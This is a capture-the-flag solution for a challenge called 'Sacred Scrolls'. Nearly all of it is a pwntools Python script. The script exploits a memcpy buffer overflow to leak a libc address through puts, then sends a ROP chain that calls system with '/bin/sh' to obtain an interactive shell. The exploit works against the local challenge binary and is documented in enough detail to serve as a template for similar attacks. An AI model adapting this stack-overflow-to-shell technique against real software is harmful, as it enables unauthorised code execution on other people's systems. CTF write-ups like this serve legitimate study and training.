# Sacred Scrolls

### Solution
```
#!/usr/bin/env python3

# STEP 1
# memcpy in spell_save function can overwrite return address,
# using puts as return address to leak the libc address
# and then finally ROP back to main function

# STEP 2
# send new payload that executes system using /bin/sh found in libc 

from pwn import *
import os

elf = ELF("./sacred_scrolls")
libc = ELF('./glibc/libc.so.6')

rop = ROP(elf)
ps = elf.process()

def execute_payload(payload_rop):
    # TAG
    ps.sendline(b"JesusCries")
    ps.recvuntil(b">> ")

    # UPLOAD
    ps.sendline(b"1")
    ps.recvuntil(b": ")

    # GENERATE PAYLOAD
    with open("spell.txt", "wb") as f:
        # HEADER SIGNATURE
        signature = u'👓⚡'.encode()
        f.write(signature)

        # PAYLOAD - Overwrite return address with payload
        payload = b"A"*(33) + payload_rop
        f.write(payload)

    # ZIP PAYLOAD
    os.system(f"rm spell.zip &> /dev/null; zip spell.zip spell.txt")

    # BASE64 ENCODE PAYLOAD BEFORE UPLOAD
    with open("spell.zip","rb") as f:
        spellzipped = f.read()[:-1]
    spell64 = base64.b64encode(spellzipped)
    print("Sending payload: ", spell64)

    #SEND PAYLOAD
    ps.sendline(spell64)
    ps.recvuntil(b">> ")

    # READ
    ps.sendline(b"2")
    ps.recvuntil(b">> ")

    # LEAVE
    ps.sendline(b"3")

# SEND FIRST PAYLOAD 
# Does not require elf.got.puts since we are leaking libc address not leaking puts address
payload = p64(elf.plt.puts) 
payload += p64(elf.symbols["main"])
execute_payload(payload)

# parse leaked libc addr
ps.recvuntil(b"saved!\n")
leaked_addr_hex = ps.recvline()[:-1]
leaked_libc_int = u64(leaked_addr_hex.ljust(8, b"\x00"))
print("libc leak address: " + hex(leaked_libc_int))

# get start of libc using offset found with GDB
libc_base_addr = leaked_libc_int - 0x620d0

rop = ROP(libc)

# addresses used in payload 2
system_address = libc_base_addr + libc.symbols["system"]
bin_sh_addr = libc_base_addr + next(libc.search(b"/bin/sh"))
pop_rdi_addr = libc_base_addr + (rop.find_gadget(['pop rdi', 'ret']))[0]
ret_addr = libc_base_addr + (rop.find_gadget(['ret']))[0]

# SEND SECOND PAYLOAD
payload = p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_address)
execute_payload(payload)

ps.interactive()
``` 

**Flag:** ``
